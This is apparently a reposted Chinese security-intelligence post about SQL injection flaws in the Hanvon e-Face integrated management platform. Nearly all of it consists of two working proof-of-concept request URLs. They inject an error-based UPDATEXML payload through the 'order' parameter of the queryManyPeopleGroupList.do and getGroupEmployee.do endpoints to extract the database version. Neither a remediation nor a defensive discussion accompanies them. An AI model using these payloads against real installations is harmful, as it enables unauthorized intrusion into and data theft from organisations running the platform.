> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzU2NDY2OTU4Nw==&mid=2247521663&idx=1&sn=1a7aa58916d280391fd2526ffe2c169f

#  护网情报 ｜汉王e脸通综合管理平台SQL注入漏洞  
小浪  船山信安   2025-07-07 15:40  
  
queryManyPeopleGroupList接口SQL注入  
  
POC:  

```
/manage/authMultiplePeople/queryManyPeopleGroupList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))
```

  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicP9UCoHxicWVyZ3PTr9kjJFMxVqEg0C3W4R2hAkibUeavWTSBnibb3KnOLkbRbCKZ7klSHb7VefeyrUQ/640?wx_fmt=jpeg "")  
  
  
getGroupEmployee  SQL注入  

```
/manage/authMultiplePeople/getGroupEmployee.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))
```

  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicP9UCoHxicWVyZ3PTr9kjJFMltscRw7MZ8HrKbwvKUCmjpyY1icYA8hV1VF3nwTqY5UanEj2picLUnicg/640?wx_fmt=jpeg "")  
  
  
  
